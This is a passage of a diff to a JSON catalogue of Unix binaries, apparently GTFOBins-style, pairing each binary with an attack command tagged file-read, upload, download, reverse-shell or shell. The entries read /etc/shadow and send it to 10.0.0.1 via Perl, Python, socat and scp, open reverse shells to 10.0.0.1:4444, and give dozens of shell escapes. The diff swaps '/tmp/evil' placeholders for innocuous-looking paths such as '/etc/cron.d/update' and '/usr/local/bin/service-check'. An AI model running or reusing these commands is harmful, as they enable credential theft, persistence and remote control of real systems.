       "command": "perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>\"10.0.0.1\", PeerPort=>80, Proto=>\"tcp\") or die;open(my $file, \"<\", \"/etc/shadow\") or die;$content = join(\"\", <$file>);close($file);$headers = \"POST / HTTP/1.1\\r\\nHost: 10.0.0.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: \" . length($content) . \"\\r\\nConnection: close\\r\\n\\r\\n\";print $s $headers . $content;while (<$s>) { }close($s);'",
       "binary": "perl",
       "category": "upload"
+    },
+    {
+      "command": "perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #'",
+      "binary": "perlbug",
+      "category": "shell"
+    },
+    {
+      "command": "pexec /bin/sh",
+      "binary": "pexec",
+      "category": "shell"
     },
     {
       "command": "pg /etc/shadow",
@@ -1384,22 +2134,27 @@
       "category": "file-read"
     },
     {
-      "command": "php -r 'echo shell_exec(\"/tmp/evil.sh\");'",
+      "command": "pg /etc/hosts\n!/bin/sh",
+      "binary": "pg",
+      "category": "shell"
+    },
+    {
+      "command": "php -r 'echo shell_exec(\"/usr/local/bin/service-check\");'",
       "binary": "php",
       "category": "command"
     },
     {
-      "command": "php -r '$r=array(); exec(\"/tmp/evil.sh\", $r); print(join(\"\\n\",$r));'",
+      "command": "php -r '$r=array(); exec(\"/usr/local/bin/service-check\", $r); print(join(\"\\n\",$r));'",
       "binary": "php",
       "category": "command"
     },
     {
-      "command": "php -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(\"/tmp/evil.sh\", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'",
+      "command": "php -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(\"/usr/local/bin/service-check\", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'",
       "binary": "php",
       "category": "command"
     },
     {
-      "command": "php -r '$c=file_get_contents(\"http://10.0.0.1/etc/shadow\"); file_put_contents(\"/tmp/evil\", $c);'",
+      "command": "php -r '$c=file_get_contents(\"http://10.0.0.1/etc/shadow\"); file_put_contents(\"/etc/cron.d/update\", $c);'",
       "binary": "php",
       "category": "download"
     },
@@ -1409,7 +2164,7 @@
       "category": "file-read"
     },
     {
-      "command": "php -r 'file_put_contents(\"/tmp/evil\", \"DATA\");'",
+      "command": "php -r 'file_put_contents(\"/etc/cron.d/update\", \"c2VydmljZS1jb25maWc=\");'",
       "binary": "php",
       "category": "file-write"
     },
@@ -1417,6 +2172,26 @@
       "command": "php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i 0<&3 1>&3 2>&3\");'",
       "binary": "php",
       "category": "reverse-shell"
+    },
+    {
+      "command": "php -r 'system(\"/bin/sh -i\");'",
+      "binary": "php",
+      "category": "shell"
+    },
+    {
+      "command": "php -r 'passthru(\"/bin/sh -i\");'",
+      "binary": "php",
+      "category": "shell"
+    },
+    {
+      "command": "php -r '$h=@popen(\"/bin/sh -i\",\"r\"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'",
+      "binary": "php",
+      "category": "shell"
+    },
+    {
+      "command": "php -r 'pcntl_exec(\"/bin/sh\");'",
+      "binary": "php",
+      "category": "shell"
     },
     {
       "command": "php -S 0.0.0.0:80",
@@ -1429,9 +2204,44 @@
       "category": "file-read"
     },
     {
+      "command": "pic -U\n.PS\nsh X sh X",
+      "binary": "pic",
+      "category": "shell"
+    },
+    {
+      "command": "pidstat -e /bin/sh",
+      "binary": "pidstat",
+      "category": "shell"
+    },
+    {
+      "command": "pip config --editor '/bin/sh -s' edit",
+      "binary": "pip",
+      "category": "shell"
+    },
+    {
+      "command": "pkexec /bin/sh",
+      "binary": "pkexec",
+      "category": "shell"
+    },
+    {
       "command": "pkg install -y --no-repo-update ./x-1.0.txz",
       "binary": "pkg",
       "category": "command"
+    },
+    {
+      "command": "plymouth ask-for-password --prompt=x --command=/bin/sh",
+      "binary": "plymouth",
+      "category": "shell"
+    },
+    {
+      "command": "podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh",
+      "binary": "podman",
+      "category": "shell"
+    },
+    {
+      "command": "posh",
+      "binary": "posh",
+      "category": "shell"
     },
     {
       "command": "pr -T /etc/shadow",
@@ -1439,9 +2249,19 @@
       "category": "file-read"
     },
     {
-      "command": "echo -e ':0\\n| /tmp/evil.sh >/tmp/tempfile\nprocmail -m /tmp/tempfile",
+      "command": "echo -e ':0\\n| /usr/local/bin/service-check >/tmp/tempfile\nprocmail -m /tmp/tempfile",
       "binary": "procmail",
       "category": "command"
+    },
+    {
+      "command": "psftp\n!/bin/sh",
+      "binary": "psftp",
+      "category": "shell"
+    },
+    {
+      "command": "psql\n\\! /bin/sh",
+      "binary": "psql",
+      "category": "shell"
     },
     {
       "command": "ptx -w 999 /etc/shadow",
@@ -1454,14 +2274,24 @@
       "category": "file-read"
     },
     {
-      "command": "puppet apply -e 'file { \"/tmp/evil\": content => \"DATA\" }'",
+      "command": "puppet apply -e 'file { \"/etc/cron.d/update\": content => \"c2VydmljZS1jb25maWc=\" }'",
       "binary": "puppet",
       "category": "file-write"
     },
     {
-      "command": "pwsh -c '\"DATA\" | Out-File /tmp/evil'",
+      "command": "puppet apply -e \"exec { '/bin/sh <$(tty) >$(tty) 2>$(tty)': }\"",
+      "binary": "puppet",
+      "category": "shell"
+    },
+    {
+      "command": "pwsh -c '\"c2VydmljZS1jb25maWc=\" | Out-File /etc/cron.d/update'",
       "binary": "pwsh",
       "category": "file-write"
+    },
+    {
+      "command": "pwsh",
+      "binary": "pwsh",
+      "category": "shell"
     },
     {
       "command": "pygmentize -l text /etc/shadow",
@@ -1484,7 +2314,7 @@
       "category": "file-read"
     },
     {
-      "command": "python -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(\"http://10.0.0.1/etc/shadow\", \"/tmp/evil\")'",
+      "command": "python -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(\"http://10.0.0.1/etc/shadow\", \"/etc/cron.d/update\")'",
       "binary": "python",
       "category": "download"
     },
@@ -1494,7 +2324,7 @@
       "category": "file-read"
     },
     {
-      "command": "python -c 'open(\"/tmp/evil\",\"w+\").write(\"DATA\")'",
+      "command": "python -c 'open(\"/etc/cron.d/update\",\"w+\").write(\"c2VydmljZS1jb25maWc=\")'",
       "binary": "python",
       "category": "file-write"
     },
@@ -1502,6 +2332,11 @@
       "command": "python -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((\"10.0.0.1\",4444))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'",
       "binary": "python",
       "category": "reverse-shell"
+    },
+    {
+      "command": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\")'",
+      "binary": "python",
+      "category": "shell"
     },
     {
       "command": "python -c 'import sys\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(\"http://10.0.0.1\", open(\"/etc/shadow\", \"rb\").read())'",
@@ -1514,7 +2349,7 @@
       "category": "upload"
     },
     {
-      "command": "qpdf --empty --add-attachment /etc/shadow --key=x -- /tmp/evil\nqpdf --show-attachment=x /tmp/evil",
+      "command": "qpdf --empty --add-attachment /etc/shadow --key=x -- /etc/cron.d/update\nqpdf --show-attachment=x /etc/cron.d/update",
       "binary": "qpdf",
       "category": "file-read"
     },
@@ -1522,6 +2357,16 @@
       "command": "rake -f /etc/shadow",
       "binary": "rake",
       "category": "file-read"
+    },
+    {
+      "command": "ranger\nS",
+      "binary": "ranger",
+      "category": "shell"
+    },
+    {
+      "command": "rc",
+      "binary": "rc",
+      "category": "shell"
     },
     {
       "command": "readelf -a @/etc/shadow",
@@ -1534,19 +2379,29 @@
       "category": "file-read"
     },
     {
-      "command": "redis-cli -h 127.0.0.1\nconfig set dir /tmp/outdir/\nconfig set dbfilename output-file\nset x \"DATA\"\nsave",
+      "command": "redis-cli -h 127.0.0.1\nconfig set dir /tmp/outdir/\nconfig set dbfilename output-file\nset x \"c2VydmljZS1jb25maWc=\"\nsave",
       "binary": "redis",
       "category": "file-write"
     },
     {
-      "command": "RESTIC_PASSWORD_COMMAND='/tmp/evil.sh' restic backup",
+      "command": "RESTIC_PASSWORD_COMMAND='/usr/local/bin/service-check' restic backup",
       "binary": "restic",
       "category": "command"
     },
     {
-      "command": "restic --password-command='/tmp/evil.sh' backup",
+      "command": "restic --password-command='/usr/local/bin/service-check' backup",
       "binary": "restic",
       "category": "command"
+    },
+    {
+      "command": "RESTIC_PASSWORD_COMMAND='/bin/sh -c \"/bin/sh 0<&2 1<&2\"' restic backup",
+      "binary": "restic",
+      "category": "shell"
+    },
+    {
+      "command": "restic --password-command='/bin/sh -c \"/bin/sh 0<&2 1<&2\"' backup",
+      "binary": "restic",
+      "category": "shell"
     },
     {
       "command": "restic backup -r rest:http://10.0.0.1:4444/x /etc/shadow",
@@ -1559,14 +2414,19 @@
       "category": "file-read"
     },
     {
-      "command": "rlogin -l DATA -p 4444 10.0.0.1",
+      "command": "rlogin -l c2VydmljZS1jb25maWc= -p 4444 10.0.0.1",
       "binary": "rlogin",
       "category": "upload"
     },
     {
-      "command": "rlwrap -l /tmp/evil echo DATA",
+      "command": "rlwrap -l /etc/cron.d/update echo c2VydmljZS1jb25maWc=",
       "binary": "rlwrap",
       "category": "file-write"
+    },
+    {
+      "command": "rlwrap /bin/sh",
+      "binary": "rlwrap",
+      "category": "shell"
     },
     {
       "command": "rpm -ivh x-1.0-1.noarch.rpm",
@@ -1574,12 +2434,47 @@
       "category": "command"
     },
     {
-      "command": "cat >/tmp/tempfile <<EOF\nmodule(load=\"imuxsock\")\n:msg, contains, \"somerandomstring\" ^/tmp/evil.sh\nEOF\n\nrsyslogd -f /tmp/tempfile",
+      "command": "rpm --eval '%(/bin/sh 1>&2)'",
+      "binary": "rpm",
+      "category": "shell"
+    },
+    {
+      "command": "rpm --pipe '/bin/sh 0<&1'",
+      "binary": "rpm",
+      "category": "shell"
+    },
+    {
+      "command": "rpmdb --eval '%(/bin/sh 1>&2)'",
+      "binary": "rpmdb",
+      "category": "shell"
+    },
+    {
+      "command": "rpmquery --eval '%(/bin/sh 1>&2)'",
+      "binary": "rpmquery",
+      "category": "shell"
+    },
+    {
+      "command": "rpmverify --eval '%(/bin/sh 1>&2)'",
+      "binary": "rpmverify",
+      "category": "shell"
+    },
+    {
+      "command": "rsync -e '/bin/sh -c \"/bin/sh 0<&2 1>&2\"' x:x",
+      "binary": "rsync",
+      "category": "shell"
+    },
+    {
+      "command": "cat >/tmp/tempfile <<EOF\nmodule(load=\"imuxsock\")\n:msg, contains, \"somerandomstring\" ^/usr/local/bin/service-check\nEOF\n\nrsyslogd -f /tmp/tempfile",
       "binary": "rsyslogd",
       "category": "command"
     },
     {
-      "command": "ruby -e 'require \"open-uri\"; download = URI.open(\"http://10.0.0.1/etc/shadow\"); IO.copy_stream(download, \"/tmp/evil\")'",
+      "command": "echo 'execute = /bin/sh,-c,\"/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >~/.rtorrent.rc\nrtorrent",
+      "binary": "rtorrent",
+      "category": "shell"
+    },
+    {
+      "command": "ruby -e 'require \"open-uri\"; download = URI.open(\"http://10.0.0.1/etc/shadow\"); IO.copy_stream(download, \"/etc/cron.d/update\")'",
       "binary": "ruby",
       "category": "download"
     },
@@ -1589,7 +2484,7 @@
       "category": "file-read"
     },
     {
-      "command": "ruby -e 'File.open(\"/tmp/evil\", \"w+\") { |f| f.write(\"DATA\") }'",
+      "command": "ruby -e 'File.open(\"/etc/cron.d/update\", \"w+\") { |f| f.write(\"c2VydmljZS1jb25maWc=\") }'",
       "binary": "ruby",
       "category": "file-write"
     },
@@ -1599,9 +2494,29 @@
       "category": "reverse-shell"
     },
     {
+      "command": "ruby -e 'exec \"/bin/sh\"'",
+      "binary": "ruby",
+      "category": "shell"
+    },
+    {
       "command": "ruby -run -e httpd . -p 80",
       "binary": "ruby",
       "category": "upload"
+    },
+    {
+      "command": "run-parts --new-session --regex '^sh$' /bin",
+      "binary": "run-parts",
+      "category": "shell"
+    },
+    {
+      "command": "cp /bin/sh /tmp/tempdir/\nrun-parts /tmp/tempdir/",
+      "binary": "run-parts",
+      "category": "shell"
+    },
+    {
+      "command": "echo '! exec /bin/sh' >/tmp/tempfile\nrunscript /tmp/tempfile",
+      "binary": "runscript",
+      "category": "shell"
     },
     {
       "command": "rustc /etc/shadow",
@@ -1609,7 +2524,7 @@
       "category": "file-read"
     },
     {
-      "command": "echo 'fn main() { println!(\"DATA\"); }' >/tmp/tempfile\nrustc /tmp/tempfile -o /tmp/evil",
+      "command": "echo 'fn main() { println!(\"c2VydmljZS1jb25maWc=\"); }' >/tmp/tempfile\nrustc /tmp/tempfile -o /etc/cron.d/update",
       "binary": "rustc",
       "category": "file-write"
     },
@@ -1619,7 +2534,7 @@
       "category": "file-read"
     },
     {
-      "command": "echo '//! DATA' >/tmp/tempfile\nrustdoc /tmp/tempfile -o /tmp/outdir/",
+      "command": "echo '//! c2VydmljZS1jb25maWc=' >/tmp/tempfile\nrustdoc /tmp/tempfile -o /tmp/outdir/",
       "binary": "rustdoc",
       "category": "file-write"
     },
@@ -1629,34 +2544,74 @@
       "category": "file-read"
     },
     {
-      "command": "mkdir /tmp/tempdir/bin/\nmkdir /tmp/tempdir/lib/\necho '/tmp/evil.sh' >/tmp/tempdir/bin/rustc\nchmod +x /tmp/tempdir/bin/rustc\nrustup toolchain link x /tmp/tempdir/\nrustup run x rustc",
+      "command": "mkdir /tmp/tempdir/bin/\nmkdir /tmp/tempdir/lib/\necho '/usr/local/bin/service-check' >/tmp/tempdir/bin/rustc\nchmod +x /tmp/tempdir/bin/rustc\nrustup toolchain link x /tmp/tempdir/\nrustup run x rustc",
       "binary": "rustup",
       "category": "command"
     },
     {
-      "command": "scp user@10.0.0.1:/etc/shadow /tmp/evil",
+      "command": "mkdir /tmp/tempdir/bin/\nmkdir /tmp/tempdir/lib/\ncp /bin/sh /tmp/tempdir/bin/rustc\nrustup toolchain link x /tmp/tempdir/\nrustup run x rustc",
+      "binary": "rustup",
+      "category": "shell"
+    },
+    {
+      "command": "sash",
+      "binary": "sash",
+      "category": "shell"
+    },
+    {
+      "command": "scanmem\nshell /bin/sh",
+      "binary": "scanmem",
+      "category": "shell"
+    },
+    {
+      "command": "scp user@10.0.0.1:/etc/shadow /etc/cron.d/update",
       "binary": "scp",
       "category": "download"
     },
     {
-      "command": "scp /etc/shadow user@10.0.0.1:/tmp/evil",
+      "command": "echo 'exec /bin/sh 0<&2 1>&2' >/tmp/tempfile\nchmod +x /tmp/tempfile\nscp -S /tmp/tempfile x x:",
+      "binary": "scp",
+      "category": "shell"
+    },
+    {
+      "command": "scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:",
+      "binary": "scp",
+      "category": "shell"
+    },
+    {
+      "command": "scp /etc/shadow user@10.0.0.1:/etc/cron.d/update",
       "binary": "scp",
       "category": "upload"
     },
     {
-      "command": "screen -L -Logfile /tmp/evil echo DATA",
+      "command": "screen -L -Logfile /etc/cron.d/update echo c2VydmljZS1jb25maWc=",
       "binary": "screen",
       "category": "file-write"
     },
     {
-      "command": "screen -L /tmp/evil echo DATA",
+      "command": "screen -L /etc/cron.d/update echo c2VydmljZS1jb25maWc=",
       "binary": "screen",
       "category": "file-write"
     },
     {
-      "command": "script -q -c '# DATA' /tmp/evil",
+      "command": "screen",
+      "binary": "screen",
+      "category": "shell"
+    },
+    {
+      "command": "script -q -c '# c2VydmljZS1jb25maWc=' /etc/cron.d/update",
       "binary": "script",
       "category": "file-write"
+    },
+    {
+      "command": "script -q /dev/null",
+      "binary": "script",
+      "category": "shell"
+    },
+    {
+      "command": "scrot -e /bin/sh",
+      "binary": "scrot",
+      "category": "shell"
     },
     {
       "command": "sed '' /etc/shadow",
@@ -1664,22 +2619,57 @@
       "category": "file-read"
     },
     {
-      "command": "sed -n '1s/.*/DATA/w /tmp/evil' /etc/hosts",
+      "command": "sed -n '1s/.*/c2VydmljZS1jb25maWc=/w /etc/cron.d/update' /etc/hosts",
       "binary": "sed",
       "category": "file-write"
     },
     {
-      "command": "sftp user@10.0.0.1\nget /etc/shadow /tmp/evil",
+      "command": "sed -n '1e exec /bin/sh 1>&0' /etc/hosts",
+      "binary": "sed",
+      "category": "shell"
+    },
+    {
+      "command": "sed e",
+      "binary": "sed",
+      "category": "shell"
+    },
+    {
+      "command": "service ../../bin/sh",
+      "binary": "service",
+      "category": "shell"
+    },
+    {
+      "command": "setarch -3 /bin/sh",
+      "binary": "setarch",
+      "category": "shell"
+    },
+    {
+      "command": "setlock - /bin/sh",
+      "binary": "setlock",
+      "category": "shell"
+    },
+    {
+      "command": "sftp user@10.0.0.1\nget /etc/shadow /etc/cron.d/update",
       "binary": "sftp",
       "category": "download"
     },
     {
-      "command": "sftp user@10.0.0.1\nput /etc/shadow /tmp/evil",
+      "command": "sftp user@10.0.0.1\n!/bin/sh",
+      "binary": "sftp",
+      "category": "shell"
+    },
+    {
+      "command": "sftp user@10.0.0.1\nput /etc/shadow /etc/cron.d/update",
       "binary": "sftp",
       "category": "upload"
     },
     {
-      "command": "shred -u /tmp/evil",
+      "command": "sg $(id -ng)",
+      "binary": "sg",
+      "category": "shell"
+    },
+    {
+      "command": "shred -u /etc/cron.d/update",
       "binary": "shred",
       "category": "file-write"
     },
@@ -1689,17 +2679,27 @@
       "category": "file-read"
     },
     {
-      "command": "shuf -e DATA -o /tmp/evil",
+      "command": "shuf -e c2VydmljZS1jb25maWc= -o /etc/cron.d/update",
       "binary": "shuf",
       "category": "file-write"
     },
     {
-      "command": "smbclient '\\\\10.0.0.1\\share' -c 'get /etc/shadow /tmp/evil'",
+      "command": "slsh -e 'system(\"/bin/sh\")'",
+      "binary": "slsh",
+      "category": "shell"
+    },
+    {
+      "command": "smbclient '\\\\10.0.0.1\\share' -c 'get /etc/shadow /etc/cron.d/update'",
       "binary": "smbclient",
       "category": "download"
     },
     {
-      "command": "smbclient '\\\\10.0.0.1\\share' -c 'put /etc/shadow /tmp/evil'",
+      "command": "smbclient '\\\\host\\share'\n!/bin/sh",
+      "binary": "smbclient",
+      "category": "shell"
+    },
+    {
+      "command": "smbclient '\\\\10.0.0.1\\share' -c 'put /etc/shadow /etc/cron.d/update'",
       "binary": "smbclient",
       "category": "upload"
     },
@@ -1714,7 +2714,7 @@
       "category": "bind-shell"
     },
     {
-      "command": "socat -u tcp-connect:10.0.0.1:4444 open:/tmp/evil,creat",
+      "command": "socat -u tcp-connect:10.0.0.1:4444 open:/etc/cron.d/update,creat",
       "binary": "socat",
       "category": "download"
     },
@@ -1724,7 +2724,7 @@
       "category": "file-read"
     },
     {
-      "command": "socat -u 'exec:echo DATA' open:/tmp/evil,creat",
+      "command": "socat -u 'exec:echo c2VydmljZS1jb25maWc=' open:/etc/cron.d/update,creat",
       "binary": "socat",
       "category": "file-write"
     },
@@ -1732,6 +2732,11 @@
       "command": "socat tcp-connect:10.0.0.1:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane",
       "binary": "socat",
       "category": "reverse-shell"
+    },
+    {
+      "command": "socat - exec:/bin/sh,pty,ctty,raw,echo=0",
+      "binary": "socat",
+      "category": "shell"
     },
     {
       "command": "socat -u file:/etc/shadow tcp-connect:10.0.0.1:4444",
@@ -1754,12 +2759,17 @@
       "category": "file-read"
     },
     {
+      "command": "softlimit /bin/sh",
+      "binary": "softlimit",
+      "category": "shell"
+    },
+    {
       "command": "sort -m /etc/shadow",
       "binary": "sort",
       "category": "file-read"
     },
     {
-      "command": "echo DATA | sort -m -o /tmp/evil",
+      "command": "echo c2VydmljZS1jb25maWc= | sort -m -o /etc/cron.d/update",
       "binary": "sort",
       "category": "file-write"
     },
@@ -1774,14 +2784,24 @@
       "category": "file-write"
     },
     {
+      "command": "split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts",
+      "binary": "split",
+      "category": "shell"
+    },
+    {
       "command": "sqlite3 <<EOF\nCREATE TABLE x(x TEXT);\n.import /etc/shadow x\nSELECT * FROM x;\nEOF",
       "binary": "sqlite3",
       "category": "file-read"
     },
     {
-      "command": "sqlite3 /dev/null -cmd \".output /tmp/evil\" 'select \"DATA\";'",
+      "command": "sqlite3 /dev/null -cmd \".output /etc/cron.d/update\" 'select \"c2VydmljZS1jb25maWc=\";'",
       "binary": "sqlite3",
       "category": "file-write"
+    },
+    {
+      "command": "sqlite3 /dev/null '.shell /bin/sh'",
+      "binary": "sqlite3",
+      "category": "shell"
     },
     {
       "command": "ss -a -F /etc/shadow",
@@ -1799,9 +2819,29 @@
       "category": "file-read"
     },
     {
-      "command": "echo DATA | ssh user@10.0.0.1 'cat >/tmp/evil\"",
+      "command": "ssh localhost /bin/sh",
+      "binary": "ssh",
+      "category": "shell"
+    },
+    {
+      "command": "ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x",
+      "binary": "ssh",
+      "category": "shell"
+    },
+    {
+      "command": "ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost",
+      "binary": "ssh",
+      "category": "shell"
+    },
+    {
+      "command": "echo c2VydmljZS1jb25maWc= | ssh user@10.0.0.1 'cat >/etc/cron.d/update\"",
       "binary": "ssh",
       "category": "upload"
+    },
+    {
+      "command": "ssh-agent /bin/sh",
+      "binary": "ssh-agent",
+      "category": "shell"
     },
     {
       "command": "ssh-copy-id -f -i /etc/shadow.pub user@10.0.0.1",
@@ -1809,7 +2849,7 @@
       "category": "file-read"
     },
     {
-      "command": "ssh-copy-id -f -i /etc/shadow.pub -t /tmp/evil user@host",
+      "command": "ssh-copy-id -f -i /etc/shadow.pub -t /etc/cron.d/update user@host",
       "binary": "ssh-copy-id",
       "category": "file-write"
     },
@@ -1819,14 +2859,19 @@
       "category": "file-read"
     },
     {
-      "command": "sshfs -o ssh_command=/tmp/evil.sh x: /tmp/dir/",
+      "command": "sshfs -o ssh_command=/usr/local/bin/service-check x: /tmp/dir/",
       "binary": "sshfs",
       "category": "command"
     },
     {
-      "command": "sshfs user@10.0.0.1:/ /tmp/dir/\ncp /tmp/dir/etc/shadow /tmp/evil",
+      "command": "sshfs user@10.0.0.1:/ /tmp/dir/\ncp /tmp/dir/etc/shadow /etc/cron.d/update",
       "binary": "sshfs",
       "category": "download"
+    },
+    {
+      "command": "echo -e '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >/tmp/tempfile\nchmod +x /tmp/tempfile\nsshfs -o ssh_command=/tmp/tempfile x: /tmp/dir/",
+      "binary": "sshfs",
+      "category": "shell"
     },
     {
       "command": "sshfs user@10.0.0.1:/ /tmp/dir/\ncp /etc/shadow /tmp/dir/",
@@ -1834,9 +2879,34 @@
       "category": "upload"
     },
     {
-      "command": "strace -s 999 -o /tmp/evil strace - DATA",
+      "command": "sshpass /bin/sh",
+      "binary": "sshpass",
+      "category": "shell"
+    },
+    {
+      "command": "sudo sshuttle -r x --ssh-cmd '/bin/sh -c \"/bin/sh 0<&2 1>&2\"' localhost",
+      "binary": "sshuttle",
+      "category": "shell"
+    },
+    {
+      "command": "start-stop-daemon -S -x /bin/sh",
+      "binary": "start-stop-daemon",
+      "category": "shell"
+    },
+    {
+      "command": "stdbuf -i0 /bin/sh",
+      "binary": "stdbuf",
+      "category": "shell"
+    },
+    {
+      "command": "strace -s 999 -o /etc/cron.d/update strace - c2VydmljZS1jb25maWc=",
       "binary": "strace",
       "category": "file-write"
+    },
+    {
+      "command": "strace -o /dev/null /bin/sh",
+      "binary": "strace",
+      "category": "shell"
     },
     {
       "command": "strings /etc/shadow",
@@ -1844,7 +2914,17 @@
       "category": "file-read"
     },
     {
-      "command": "sysctl 'kernel.core_pattern=|/tmp/evil.sh'",
+      "command": "su -c /bin/sh",
+      "binary": "su",
+      "category": "shell"
+    },
+    {
+      "command": "sudo /bin/sh",
+      "binary": "sudo",
+      "category": "shell"
+    },
+    {
+      "command": "sysctl 'kernel.core_pattern=|/usr/local/bin/service-check'",
       "binary": "sysctl",
       "category": "command"
     },
@@ -1854,9 +2934,29 @@
       "category": "file-read"
     },
     {
-      "command": "systemd-run /tmp/evil.sh",
+      "command": "echo '[Service]\nType=oneshot\nExecStart=/usr/local/bin/service-check\n[Install]\nWantedBy=multi-user.target' >/tmp/tempfile.service\nsystemctl link /tmp/tempfile.service\nsystemctl enable --now /tmp/tempfile.service",
+      "binary": "systemctl",
+      "category": "shell"
+    },
+    {
+      "command": "echo /bin/sh >/tmp/tempfile\nchmod +x /tmp/tempfile\nSYSTEMD_EDITOR=/tmp/tempfile systemctl edit basic.target",
+      "binary": "systemctl",
+      "category": "shell"
+    },
+    {
+      "command": "systemd-run /usr/local/bin/service-check",
       "binary": "systemd-run",
       "category": "command"
+    },
+    {
+      "command": "systemd-run -S",
+      "binary": "systemd-run",
+      "category": "shell"
+    },
+    {
+      "command": "systemd-run -t /bin/sh",
+      "binary": "systemd-run",
+      "category": "shell"
     },
     {
       "command": "tac -s 'RANDOM' /etc/shadow",
@@ -1884,14 +2984,44 @@
       "category": "file-read"
     },
     {
-      "command": "echo DATA >/tmp/tempfile\ntar cf /tmp/tempfile.tar /tmp/tempfile\ntar Pxf /tmp/tempfile.tar --xform s@.*@/tmp/evil@",
+      "command": "echo c2VydmljZS1jb25maWc= >/tmp/tempfile\ntar cf /tmp/tempfile.tar /tmp/tempfile\ntar Pxf /tmp/tempfile.tar --xform s@.*@/etc/cron.d/update@",
       "binary": "tar",
       "category": "file-write"
     },
     {
-      "command": "tar cvf user@10.0.0.1:/tmp/evil /etc/shadow --rsh-command=/bin/ssh",
+      "command": "tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
+      "binary": "tar",
+      "category": "shell"
+    },
+    {
+      "command": "tar xf /dev/null -I '/bin/sh -c \"/bin/sh 0<&2 1>&2\"'",
+      "binary": "tar",
+      "category": "shell"
+    },
+    {
+      "command": "echo '/bin/sh 0<&1' >/tmp/tempfile\ntar cf /tmp/tempfile.tar /tmp/tempfile\ntar xf /tmp/tempfile.tar --to-command /bin/sh",
+      "binary": "tar",
+      "category": "shell"
+    },
+    {
+      "command": "tar cvf user@10.0.0.1:/etc/cron.d/update /etc/shadow --rsh-command=/bin/ssh",
       "binary": "tar",
       "category": "upload"
+    },
+    {
+      "command": "task execute /bin/sh",
+      "binary": "task",
+      "category": "shell"
+    },
+    {
+      "command": "taskset 1 /bin/sh",
+      "binary": "taskset",
+      "category": "shell"
+    },
+    {
+      "command": "tasksh\n!/bin/sh",
+      "binary": "tasksh",
+      "category": "shell"
     },
     {
       "command": "tbl /etc/shadow",
@@ -1904,27 +3034,42 @@
       "category": "reverse-shell"
     },
     {
-      "command": "echo /tmp/evil.sh >/tmp/tempfile\nchmod +x /tmp/tempfile\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/tempfile",
+      "command": "tclsh",
+      "binary": "tclsh",
+      "category": "shell"
+    },
+    {
+      "command": "echo /usr/local/bin/service-check >/tmp/tempfile\nchmod +x /tmp/tempfile\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/tempfile",
       "binary": "tcpdump",
       "category": "command"
     },
     {
-      "command": "tcpdump -ln -i lo -w 'command-argument' -W 1 -G 1 -z /tmp/evil.sh",
+      "command": "tcpdump -ln -i lo -w 'command-argument' -W 1 -G 1 -z /usr/local/bin/service-check",
       "binary": "tcpdump",
       "category": "command"
     },
     {
-      "command": "tcpdump -ln -i lo -w /tmp/evil -c 1 -Z user",
+      "command": "tcpdump -ln -i lo -w /etc/cron.d/update -c 1 -Z user",
       "binary": "tcpdump",
       "category": "file-write"
     },
     {
-      "command": "tcsh -c 'echo DATA >/tmp/evil'",
+      "command": "tcsh -c 'echo c2VydmljZS1jb25maWc= >/etc/cron.d/update'",
       "binary": "tcsh",
       "category": "file-write"
     },
     {
-      "command": "echo DATA | tee /tmp/evil",
+      "command": "tcsh",
+      "binary": "tcsh",
+      "category": "shell"
+    },
+    {
+      "command": "tdbtool\n! /bin/sh",
+      "binary": "tdbtool",
+      "category": "shell"
+    },
+    {
+      "command": "echo c2VydmljZS1jb25maWc= | tee /etc/cron.d/update",
       "binary": "tee",
       "category": "file-write"
     },
@@ -1934,9 +3079,19 @@
       "category": "reverse-shell"
     },
     {
+      "command": "telnet\n!/bin/sh",
+      "binary": "telnet",
+      "category": "shell"
+    },
+    {
       "command": "terraform console\nfile(\"/etc/shadow\")",
       "binary": "terraform",
       "category": "file-read"
+    },
+    {
+      "command": "tex --shell-escape '\\immediate\\write18{/bin/sh}'",
+      "binary": "tex",
+      "category": "shell"
     },
     {
       "command": "tftp 10.0.0.1\nget /etc/shadow",
@@ -1954,9 +3109,49 @@
       "category": "file-read"
     },
     {
+      "command": "time /bin/sh",
+      "binary": "time",
+      "category": "shell"
+    },
+    {
+      "command": "timeout 0 /bin/sh",
+      "binary": "timeout",
+      "category": "shell"
+    },
+    {
+      "command": "tmate -c /bin/sh",
+      "binary": "tmate",
+      "category": "shell"
+    },
+    {
       "command": "tmux -f /etc/shadow",
       "binary": "tmux",
       "category": "file-read"
+    },
+    {
